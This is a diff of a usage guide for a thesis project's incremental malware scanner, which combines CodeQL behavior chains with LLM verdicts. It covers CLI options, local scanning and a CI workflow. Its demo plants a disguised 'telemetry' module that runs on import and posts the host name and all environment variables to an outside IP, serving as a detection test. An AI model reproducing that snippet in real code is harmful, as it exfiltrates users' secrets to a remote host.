@@ -1,151 +1,125 @@
 # Incremental Malware Scanner - Usage Guide
 
-A planned extension of the system: scanning a Git repository on every push, e.g. from a GitHub Action,
-and sending to the LLM only the Behavior Chains that are new since the previous scan.
-
-## Architecture
+Continuous scanning of a Git repository with the thesis system. The first scan analyses the whole
+repository; every later scan (e.g. after each commit) re-runs the static analysis but sends to the LLM
+**only the Behavior Chains that are new** - i.e. whose fingerprint has not been evaluated before. Code
+that only moved or was re-formatted is not re-evaluated; the repository verdict is always computed over
+**all** current chains, so malicious code added in an earlier commit keeps the repository flagged until it
+is removed.
 
 ```
 inference/
-  chain_fingerprint.py      <- fingerprint computation for behavior chains
-  incremental_scanner.py    <- main orchestrator (full + incremental mode)
+  incremental_scanner.py    the scanner (CLI)
+  chain_fingerprint.py      fingerprint of a Behavior Chain (stable to moved lines / formatting)
 ```
 
-State storage (inside the target repository):
+## How a scan works
+
+1. Only the code files of the repository are copied to a temporary folder (no `.git`, data, binaries,
+   `node_modules`, virtual environments); CodeQL runs on that copy. Dependencies are never installed and the
+   scanned code is never executed. Nothing is written into the repository except its state folder.
+2. Behavior Chains → Hybrid RAG + prompt → LLM, exactly as in the thesis evaluation (same prompt, same
+   aggregation). The LLM is chosen with `LLM_PROVIDER` in `.env`; with `lmstudio` the whole scan runs on
+   the local machine (see Privacy).
+3. Chains with a known fingerprint reuse their stored verdict; only the others are sent to the LLM.
+   If the prompt, RAG mode, LLM or index changed since the stored verdicts, everything is evaluated again.
+4. If `--prev-commit` is given and no code file changed (e.g. only documentation), the scan is skipped
+   and the previous verdict is kept.
+
+State, inside the scanned repository (commit it, or cache it between CI runs):
 ```
 .malware_scan/
-  .gitignore              <- created automatically
-  baseline.json           <- fingerprints of all analysed chains   <- COMMIT TO GIT
-  last_scan.json          <- last full report                      <- COMMIT TO GIT
-  incremental/
-    commit_abc1234.json   <- report per commit
+  baseline.json        fingerprint -> verdict of every evaluated chain, + the evaluation context
+  last_scan.json       latest scan report (repository verdict, flagged chains, counts)
+  scans/<commit>.json  one report per scanned commit
 ```
 
-> **Note**: add `.malware_scan/` to the `.gitignore` of the CI runner if you do not want to commit the
-> state. For persistence between CI runs **without** committing it, use the GitHub Actions cache.
-
----
-
-## 1. First push - Full Scan (baseline)
-
-The LLM provider and its key are read from the project's `.env` (see `.env.example`).
+## Usage
 
 ```bash
-export THESIS_BASE_DIR="/path/to/Thesis"
+# first scan, or a scan that re-evaluates everything
+python3 inference/incremental_scanner.py --target /path/to/repo --package NAME --mode full
 
-python3 inference/incremental_scanner.py \
-    --target /path/to/target-repo \
-    --package my-package-name \
-    --mode full
+# later scans (incremental is the default)
+python3 inference/incremental_scanner.py --target /path/to/repo --package NAME \
+    --commit <new sha> --prev-commit <previously scanned sha> --fail-on-malicious
 ```
 
-This:
-1. runs CodeQL on the whole repository,
-2. evaluates ALL behavior chains with the LLM,
-3. stores the fingerprints in `.malware_scan/baseline.json`.
+| Option | Meaning |
+|---|---|
+| `--mode full` / `incremental` | re-evaluate every chain / only new fingerprints (default) |
+| `--commit`, `--prev-commit` | the scanned commit (default HEAD) and the previous one: changed files are reported, and a commit without code changes is skipped |
+| `--state-dir DIR` | state folder (default `<target>/.malware_scan`) |
+| `--fail-on-malicious` | exit code 2 if the repository is MALICIOUS, 3 if the evaluation is incomplete (for CI) |
+| `--keep-workdir` | keep the temporary analysis folder |
 
----
+Requirements: the thesis repository set up as in `PIPELINE.md` (venv, CodeQL, and `dataset/indexes/` -
+from the GitHub Release if you did not build them).
 
-## 2. Next commits - Incremental Scan
+## Privacy: fully local scanning
 
 ```bash
-python3 inference/incremental_scanner.py \
-    --target /path/to/target-repo \
-    --package my-package-name \
-    --mode incremental \
-    --commit abc1234def \
-    --prev-commit def5678abc
+export LLM_PROVIDER=lmstudio LM_STUDIO_MODEL=google/gemma-4-26b-a4b   # LM Studio server running with the model
+export HF_HUB_OFFLINE=1        # the embedding model is loaded from the local cache, no network check
+python3 inference/incremental_scanner.py --target /path/to/repo --package NAME
 ```
+No code, chain or prompt leaves the computer. A local model is slower (~20-35 s per new chain on an Apple
+M5), which the incremental mode offsets: after the first scan, only new chains are evaluated.
 
-This:
-1. finds the files changed between the two commits (`git diff`),
-2. runs CodeQL on the **whole** repository (for complete cross-file taint tracking),
-3. keeps the chains that touch the changed files,
-4. skips chains with a known fingerprint (already analysed),
-5. sends **only the new chains** to the LLM.
+## Try it yourself: a 5-commit demo
 
----
+```bash
+T=~/Documents/Thesis            # the thesis repository
+D=~/scanner_demo; rm -rf $D; mkdir -p $D/mylib && cd $D && git init -q
+printf 'import subprocess\n\n\ndef git_version():\n    return subprocess.run(["git", "describe"], capture_output=True, text=True).stdout\n' > mylib/__init__.py
+echo "# mylib" > README.md && git add -A && git commit -qm "1 initial"
+$T/venv/bin/python $T/inference/incremental_scanner.py --target $D --package mylib --mode full
+#   -> 1 chain evaluated, BENIGN
 
-## 3. Example GitHub Actions workflow
+P=$(git rev-parse HEAD); printf '# helpers\n\n\n' | cat - mylib/__init__.py > t && mv t mylib/__init__.py
+git commit -qam "2 moved code"
+$T/venv/bin/python $T/inference/incremental_scanner.py --target $D --package mylib --commit $(git rev-parse HEAD) --prev-commit $P
+#   -> 0 chains sent to the LLM (same fingerprint), BENIGN
+
+P=$(git rev-parse HEAD)
+printf 'import os, socket, requests\n\n\ndef _report():\n    info = {"host": socket.gethostname(), "env": dict(os.environ)}\n    requests.post("http://45.9.148.21/collect", json=info)\n' > mylib/telemetry.py
+printf '\nfrom .telemetry import _report\n_report()\n' >> mylib/__init__.py
+git add -A && git commit -qm "3 telemetry"
+$T/venv/bin/python $T/inference/incremental_scanner.py --target $D --package mylib --commit $(git rev-parse HEAD) --prev-commit $P --fail-on-malicious; echo "exit code: $?"
+#   -> only the new chain goes to the LLM, repository MALICIOUS, exit code 2
+```
+(The demo code is only analysed statically, never executed.) Continue with a README-only commit (the scan
+is skipped and the verdict stays MALICIOUS) and a commit that deletes `telemetry.py` (verdict back to BENIGN,
+no LLM call). `.malware_scan/scans/` keeps one report per commit.
+
+## Example GitHub Actions workflow (self-hosted runner)
+
+A self-hosted runner (e.g. the analyst's own machine, with the thesis repository, CodeQL and optionally
+LM Studio set up) keeps the code on that machine; the scan state is committed back to the repository.
 
 ```yaml
 name: Malware Scan
-
 on:
   push:
-    branches: [main, develop]
-
+    branches: [main]
 jobs:
   scan:
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     steps:
       - uses: actions/checkout@v4
         with:
-          fetch-depth: 2  # at least 2 commits are needed for git diff
-
-      - name: Setup Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.11'
-
-      - name: Install dependencies
-        run: pip install sentence-transformers openai numpy
-
-      - name: Install CodeQL
-        run: |
-          wget -q https://github.com/github/codeql-action/releases/latest/download/codeql-bundle-linux64.tar.gz
-          tar -xzf codeql-bundle-linux64.tar.gz
-          echo "$PWD/codeql" >> $GITHUB_PATH
-
-      - name: Restore scan baseline
-        uses: actions/cache@v4
-        with:
-          path: .malware_scan/
-          key: malware-baseline-${{ github.ref_name }}
-          restore-keys: malware-baseline-
-
-      - name: Run Incremental Scan
+          fetch-depth: 2                       # the previous commit is needed for git diff
+      - name: Scan the new commit
         env:
-          DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
-          THESIS_BASE_DIR: /path/to/thesis
+          THESIS: /path/to/Thesis                # thesis repository on the runner (.env with LLM_PROVIDER)
         run: |
-          MODE="incremental"
-          # without a baseline, run a full scan
-          if [ ! -f ".malware_scan/baseline.json" ]; then
-            MODE="full"
-          fi
-          
-          python3 /path/to/thesis/inference/incremental_scanner.py \
-            --target . \
-            --package ${{ github.event.repository.name }} \
-            --mode $MODE \
-            --commit ${{ github.sha }} \
-            --prev-commit ${{ github.event.before }}
-
-      - name: Save scan baseline
-        uses: actions/cache@v4
-        with:
-          path: .malware_scan/
-          key: malware-baseline-${{ github.ref_name }}-${{ github.sha }}
+          $THESIS/venv/bin/python $THESIS/inference/incremental_scanner.py \
+            --target . --package ${{ github.event.repository.name }} \
+            --commit ${{ github.sha }} --prev-commit ${{ github.event.before }} --fail-on-malicious
+      - name: Keep the scan state
+        if: always()
+        run: |
+          git add .malware_scan && git commit -m "malware scan state [skip ci]" && git push || true
 ```
-
----
-
-## 4. Fingerprint logic
-
-A chain is **considered the same** (skipped) if it has:
-- the same API category (e.g. `network`, `crypto_obfuscation`),
-- the same sensitive API call and flow boundary,
-- the same normalised data-flow nodes, gating conditions and source flows (lower-cased text,
-  collapsed whitespace).
-
-A chain is **considered new** if:
-- an API call changes,
-- the data flows or their node texts change (this includes renamed variables, which appear in the
-  node texts),
-- the direction (flow boundary) changes.
-
-**Does NOT affect the fingerprint** (= not analysed again):
-- line numbers (code moved to other lines),
-- whitespace / formatting changes,
-- comments.
+With a GitHub-hosted runner the same steps apply after installing CodeQL, the thesis repository and its
+indexes, and using an API provider (`DEEPSEEK_API_KEY` as a repository secret).
